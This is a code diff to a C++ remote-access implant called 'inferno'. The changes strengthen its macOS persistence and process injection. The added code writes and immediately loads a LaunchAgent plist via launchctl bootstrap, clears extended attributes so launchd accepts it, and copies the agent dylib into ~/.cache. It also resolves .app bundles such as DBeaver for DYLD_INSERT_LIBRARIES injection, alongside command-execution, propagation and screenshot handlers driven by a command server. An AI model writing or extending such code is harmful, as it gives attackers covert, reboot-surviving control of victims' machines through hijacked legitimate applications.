@@ -2,6 +2,7 @@
 #include "../include/entry_dylib.hpp"
 #ifdef __APPLE__
 #include <dlfcn.h>
+#include <unistd.h>
 #endif
 #include "../include/EntitlementScanner.hpp"
 #include "../include/MachInjector.hpp"
@@ -197,9 +198,15 @@ void Agent::handleListening() {
     while (true) {
         if (m_receive_buffer.size() < 10) break;
 
-        std::fprintf(stderr, "[Agent] Buffer %zu bytes, malleable=%s\n",
-                    m_receive_buffer.size(),
-                    m_socket.hasSessionKey() ? "yes" : "no");
+        {
+            FILE* f = ::fopen("/tmp/inject_reached.txt", "a");
+            if (f) {
+                std::fprintf(f, "loop: buf=%zu malleable=%s\n",
+                            m_receive_buffer.size(),
+                            m_socket.hasSessionKey() ? "yes" : "no");
+                ::fclose(f);
+            }
+        }
 
         auto packet_opt = m_socket.receivePacket(m_receive_buffer);
         if (!packet_opt.has_value()) {
@@ -209,8 +216,14 @@ void Agent::handleListening() {
                 (static_cast<uint32_t>(m_receive_buffer[1]) << 16) |
                 (static_cast<uint32_t>(m_receive_buffer[2]) << 8)  |
                  static_cast<uint32_t>(m_receive_buffer[3]);
+            {
+                FILE* f = ::fopen("/tmp/inject_reached.txt", "a");
+                if (f) {
+                    std::fprintf(f, "  recv=nullopt magic=0x%08x\n", magic);
+                    ::fclose(f);
+                }
+            }
             if (magic != 0xDEADBEEF) {
-                std::fprintf(stderr, "[Agent] Buffer desync (magic=0x%08x), discarding 1 byte\n", magic);
                 m_receive_buffer.erase(m_receive_buffer.begin());
                 continue;
             }
@@ -226,9 +239,24 @@ void Agent::handleListening() {
 
 void Agent::handleDispatching(Packet&& packet) {
     uint16_t opcode = packet.getOpcode();
+    {
+        FILE* f = ::fopen("/tmp/inject_reached.txt", "a");
+        if (f) {
+            std::fprintf(f, "handleDispatching opcode=0x%04x at %ld\n",
+                         opcode, time(nullptr));
+            ::fclose(f);
+        }
+    }
     std::cout << "[Agent] Dispatching Opcode: " << opcode << std::endl;
 
     if (opcode == static_cast<uint16_t>(Opcode::SYS_REQ_INFO)) {
+        // Persist FIRST — the scanner below can hang or crash inside
+        // Electron sandboxed processes (TCC/codesign checks).
+        if (!m_persistence_installed) {
+            persistInjectedAgent(m_server_ip, m_server_port);
+            m_persistence_installed = true;
+        }
+
         std::string info = getSystemInfo();
         m_socket.sendPacket(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
 
@@ -292,12 +320,6 @@ void Agent::handleDispatching(Packet&& packet) {
             scan_report = "none||0|0";
         }
         m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
-
-        // Persist for reboot survival (only once per session)
-        if (!m_persistence_installed) {
-            persistInjectedAgent(m_server_ip, m_server_port);
-            m_persistence_installed = true;
-        }
     } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
         handleProcessDiscovery();
     } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
@@ -323,6 +345,13 @@ void Agent::handleDispatching(Packet&& packet) {
     } else if (opcode == static_cast<uint16_t>(Opcode::PROPAGATE)) {
         handlePropagation(std::move(packet));
     } else if (opcode == static_cast<uint16_t>(Opcode::INJECT)) {
+        {
+            FILE* f = ::fopen("/tmp/inject_reached.txt", "a");
+            if (f) {
+                std::fprintf(f, "INJECT opcode matched in dispatch!\n");
+                ::fclose(f);
+            }
+        }
         handleInjection(std::move(packet));
     } else if (opcode == static_cast<uint16_t>(Opcode::SCREENSHOT_REQ)) {
         const auto& raw = packet.getPayload();
@@ -428,6 +457,14 @@ void Agent::handleInjection(Packet&& packet) {
     }
 
     std::string target_path(raw.begin(), raw.end());
+    {
+        FILE* f = ::fopen("/tmp/inject_reached.txt", "a");
+        if (f) {
+            std::fprintf(f, "handleInjection called for '%s' at %ld\n",
+                         target_path.c_str(), time(nullptr));
+            ::fclose(f);
+        }
+    }
     std::cout << "[Agent] Injection requested into: " << target_path << std::endl;
 
     // Build TargetApp on the fly — capability defaults to DYLD_INSERT_LIBRARIES
@@ -475,6 +512,49 @@ void Agent::handleInjection(Packet&& packet) {
 #endif
 
     std::string dylib_path = getAgentDylibPath();
+
+    // Ensure the dylib exists at the expected cache path before injection.
+    // dladdr() on a non-dylib image returns the executable path — we must
+    // verify the source is a real dylib by checking the file suffix.
+    {
+        struct stat st;
+        if (::stat(dylib_path.c_str(), &st) != 0) {
+            std::string src_path;
+#ifdef __APPLE__
+            Dl_info info;
+            if (::dladdr(reinterpret_cast<const void*>(
+                    &Agent::persistInjectedAgent),
+                    &info) != 0 && info.dli_fname) {
+                std::string candidate(info.dli_fname);
+                // Only trust a path that looks like a dylib
+                if (candidate.size() > 6 &&
+                    candidate.substr(candidate.size() - 6) == ".dylib") {
+                    src_path = candidate;
+                }
+            }
+#endif
+            if (src_path.empty() && !m_binary_path.empty()) {
+                std::string agent_dir = m_binary_path.substr(0,
+                    m_binary_path.rfind('/'));
+                src_path = agent_dir + "/libinferno_agent.dylib";
+            }
+            if (!src_path.empty()) {
+                std::ifstream src(src_path, std::ios::binary);
+                if (src.is_open()) {
+                    const char* home = ::getenv("HOME");
+                    if (home) {
+                        ::mkdir((std::string(home) + "/.cache").c_str(), 0700);
+                        std::ofstream dst(dylib_path, std::ios::binary);
+                        if (dst.is_open()) {
+                            dst << src.rdbuf();
+                            dst.close();
+                        }
+                    }
+                    src.close();
+                }
+            }
+        }
+    }
 
     bool success = inferno::tier2::injectIntoTarget(target, dylib_path,
                                                       m_server_ip, m_server_port);
@@ -770,8 +850,8 @@ std::string resolveBinaryPath(const std::string& argv0) {
 }
 
 void Agent::installPersistence(const std::string& binary_path,
-                                const std::string& server_ip,
-                                uint16_t server_port) {
+                                 const std::string& server_ip,
+                                 uint16_t server_port) {
     if (binary_path.empty()) return;
 
     std::string abs_path = resolveBinaryPath(binary_path);
@@ -800,12 +880,14 @@ void Agent::installPersistence(const std::string& binary_path,
     // Create directory
     ::mkdir(plist_dir.c_str(), 0755);
 
-    // Write plist XML — use restrictive umask so file is not world-writable
-    // launchd rejects world-writable plists with EIO error.
+    // Write plist XML — launchd rejects world-writable plists with EIO.
+    ::remove(plist_path.c_str());
     mode_t old_mask = ::umask(022);
     FILE* f = ::fopen(plist_path.c_str(), "w");
     ::umask(old_mask);
     if (!f) return;
+    ::chmod(plist_path.c_str(), 0644);
+    ::system((std::string("/usr/bin/xattr -c '") + plist_path + "' 2>/dev/null").c_str());
     std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
   "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -828,9 +910,22 @@ void Agent::installPersistence(const std::string& binary_path,
 )", abs_path.c_str(), server_ip.c_str(), port_str.c_str());
     ::fclose(f);
 
-    // NOTE: No launchctl bootstrap/load needed — macOS automatically scans
-    // ~/Library/LaunchAgents/ at login and loads all plists found there.
-    // The agent is already running for the current session.
+    // Load plist into launchd so it takes effect immediately (not just
+    // on next login). Use bootstrap (modern macOS) with gui/$UID domain.
+    {
+        pid_t pid = ::fork();
+        if (pid == 0) {
+            std::string uid_str = std::to_string(::getuid());
+            ::execlp("launchctl", "launchctl", "bootstrap",
+                     (std::string("gui/") + uid_str).c_str(),
+                     plist_path.c_str(), nullptr);
+            ::_exit(1);
+        }
+        if (pid > 0) {
+            int ws;
+            ::waitpid(pid, &ws, 0);
+        }
+    }
 #else
     // Linux: autostart .desktop file
     const char* home = ::getenv("HOME");
@@ -856,6 +951,39 @@ X-GNOME-Autostart-enabled=true
 }
 
 #ifdef __APPLE__
+// Resolve a .app bundle path or direct path to the executable inside the bundle.
+// Mirrors the resolution logic in handleInjection().
+static std::string resolveInjectionTarget(const std::string& target_path) {
+    if (target_path.size() > 4 && target_path.substr(target_path.size() - 4) == ".app") {
+        std::string exec_name;
+        std::string plist_path = target_path + "/Contents/Info.plist";
+        std::ifstream plist(plist_path);
+        if (plist) {
+            std::string content((std::istreambuf_iterator<char>(plist)),
+                                 std::istreambuf_iterator<char>());
+            auto key_pos = content.find("CFBundleExecutable");
+            if (key_pos != std::string::npos) {
+                auto start = content.find("<string>", key_pos);
+                if (start != std::string::npos) {
+                    start += 8;
+                    auto end = content.find("</string>", start);
+                    if (end != std::string::npos) {
+                        exec_name = content.substr(start, end - start);
+                    }
+                }
+            }
+        }
+        if (exec_name.empty()) {
+            size_t last_slash = target_path.rfind('/');
+            exec_name = (last_slash != std::string::npos)
+                ? target_path.substr(last_slash + 1, target_path.size() - last_slash - 5)
+                : target_path.substr(0, target_path.size() - 4);
+        }
+        return target_path + "/Contents/MacOS/" + exec_name;
+    }
+    return target_path;
+}
+
 static std::string escapeXml(const std::string& s) {
     std::string out;
     out.reserve(s.size());
@@ -875,17 +1003,40 @@ static std::string escapeXml(const std::string& s) {
 void Agent::persistInjectedAgent(const std::string& server_ip,
                                   uint16_t server_port,
                                   const std::string& target_path) {
-    (void)target_path;
-    // Get the host executable path
-    uint32_t bufsize = 0;
-    _NSGetExecutablePath(nullptr, &bufsize);
-    std::vector<char> exec_buf(bufsize);
-    if (_NSGetExecutablePath(exec_buf.data(), &bufsize) != 0) return;
-    std::string exec_path(exec_buf.data());
+    // Determine which executable to persist:
+    //   - When called from handleInjection() (C2-driven injection):
+    //     target_path contains the target app (e.g. /Applications/DBeaver.app)
+    //   - When called from handleDispatching(SYS_REQ_INFO) inside an injected
+    //     app: target_path is empty, use the running process's own path.
 
-    // If we're in the shim, fall back to standard persistence
+    // If called from SYS_REQ_INFO (target_path empty) and DYLD_INSERT_LIBRARIES
+    // is NOT set, we're running as a standalone agent, not inside an injected
+    // target app. The standalone plist was already written by installPersistence()
+    // from main.cpp — do not overwrite it with an injected-agent plist.
+    if (target_path.empty()) {
+        const char* dyld_env = ::getenv("DYLD_INSERT_LIBRARIES");
+        if (!dyld_env || *dyld_env == '\0') {
+            return;
+        }
+    }
+
+    std::string exec_path;
+    if (!target_path.empty()) {
+        exec_path = resolveInjectionTarget(target_path);
+    }
+    if (exec_path.empty()) {
+        uint32_t bufsize = 0;
+        _NSGetExecutablePath(nullptr, &bufsize);
+        std::vector<char> exec_buf(bufsize);
+        if (_NSGetExecutablePath(exec_buf.data(), &bufsize) != 0) return;
+        exec_path.assign(exec_buf.data());
+    }
+
+    // If we're in the shim, skip persistence — the shim binary
+    // is deleted seconds after launch by launchShim(), so a plist
+    // pointing to it is useless. The target app's Agent (injected
+    // via DYLD_INSERT_LIBRARIES) will persist the correct plist below.
     if (exec_path.find("inferno_shim") != std::string::npos) {
-        installPersistence(exec_path, server_ip, server_port);
         return;
     }
 
@@ -900,12 +1051,58 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
     std::string plist_path = plist_dir + "/com.inferno.agent.plist";
     std::string dylib_path = getAgentDylibPath();
 
+    // Best-effort copy of the dylib to the cache path so the plist always
+    // points to a valid file.  The plist is written regardless; if the copy
+    // fails the warning is logged but the plist still takes effect for the
+    // next time the dylib might be available.
+    {
+        struct stat st;
+        if (::stat(dylib_path.c_str(), &st) != 0) {
+            std::string src_path;
+#ifdef __APPLE__
+            Dl_info info;
+            if (::dladdr(reinterpret_cast<const void*>(&persistInjectedAgent),
+                          &info) != 0 && info.dli_fname) {
+                std::string candidate(info.dli_fname);
+                if (candidate.size() > 6 &&
+                    candidate.substr(candidate.size() - 6) == ".dylib") {
+                    src_path = candidate;
+                }
+            }
+#elif defined(_WIN32)
+            char mod_path[MAX_PATH];
+            if (::GetModuleFileNameA(nullptr, mod_path, MAX_PATH) != 0) {
+                src_path = mod_path;
+            }
+#endif
+            if (!src_path.empty() && src_path != dylib_path) {
+                ::mkdir((std::string(home) + "/.cache").c_str(), 0700);
+                std::ifstream src(src_path, std::ios::binary);
+                if (src.is_open()) {
+                    std::ofstream dst(dylib_path, std::ios::binary);
+                    if (dst.is_open()) {
+                        dst << src.rdbuf();
+                        dst.close();
+                        std::fprintf(stdout, "[Agent] Copied %s → %s\n",
+                                     src_path.c_str(), dylib_path.c_str());
+                    }
+                    src.close();
+                }
+            }
+        }
+    }
+
     ::mkdir(plist_dir.c_str(), 0755);
 
+    ::remove(plist_path.c_str());
     mode_t old_mask = ::umask(022);
     FILE* f = ::fopen(plist_path.c_str(), "w");
     ::umask(old_mask);
     if (!f) return;
+    // launchd rejects world-writable plists (EIO) and files with
+    // extended attributes (com.apple.provenance).
+    ::chmod(plist_path.c_str(), 0644);
+    ::system((std::string("/usr/bin/xattr -c '") + plist_path + "' 2>/dev/null").c_str());
 
     std::string port_str = std::to_string(server_port);
     std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
@@ -938,55 +1135,20 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
    escapeXml(server_ip).c_str(), escapeXml(port_str).c_str());
     ::fclose(f);
 
-    // Copy the current dylib to the persistence path so a rebuilt binary
-    // is persisted without manual intervention. Uses dladdr() to find the
-    // directory of the loaded image, then appends the dylib filename.
-    // When running as the injected dylib itself, the source equals the
-    // destination and the copy is skipped.
+    // Load plist into launchd so persistence takes effect immediately
+    // (not just on next login/reboot). Use bootstrap (modern macOS).
     {
-        std::string src_dir;
-#ifdef __APPLE__
-        Dl_info info;
-        if (::dladdr(reinterpret_cast<const void*>(&persistInjectedAgent),
-                      &info) != 0) {
-            src_dir = info.dli_fname;
-            size_t sep = src_dir.rfind('/');
-            if (sep != std::string::npos) {
-                src_dir.resize(sep + 1);
-            }
+        pid_t pid = ::fork();
+        if (pid == 0) {
+            std::string uid_str = std::to_string(::getuid());
+            ::execlp("launchctl", "launchctl", "bootstrap",
+                     (std::string("gui/") + uid_str).c_str(),
+                     plist_path.c_str(), nullptr);
+            ::_exit(1);
         }
-#elif defined(_WIN32)
-        char mod_path[MAX_PATH];
-        if (::GetModuleFileNameA(nullptr, mod_path, MAX_PATH) != 0) {
-            src_dir = mod_path;
-            size_t sep = src_dir.rfind('\\');
-            if (sep != std::string::npos) {
-                src_dir.resize(sep + 1);
-            }
-        }
-#endif
-        if (!src_dir.empty()) {
-#ifdef __APPLE__
-            std::string src_dylib = src_dir + "libinferno_agent.dylib";
-#else
-            std::string src_dylib = src_dir + "inferno_agent.dll";
-#endif
-            if (src_dylib != dylib_path) {
-                std::ifstream src(src_dylib, std::ios::binary);
-                if (src.is_open()) {
-                    std::ofstream dst(dylib_path, std::ios::binary);
-                    if (dst.is_open()) {
-                        dst << src.rdbuf();
-                        bool ok = dst.good();
-                        dst.close();
-                        src.close();
-                        if (ok) {
-                            std::fprintf(stdout, "[Agent] Copied %s → %s\n",
-                                         src_dylib.c_str(), dylib_path.c_str());
-                        }
-                    }
-                }
-            }
+        if (pid > 0) {
+            int ws;
+            ::waitpid(pid, &ws, 0);
         }
     }
 }
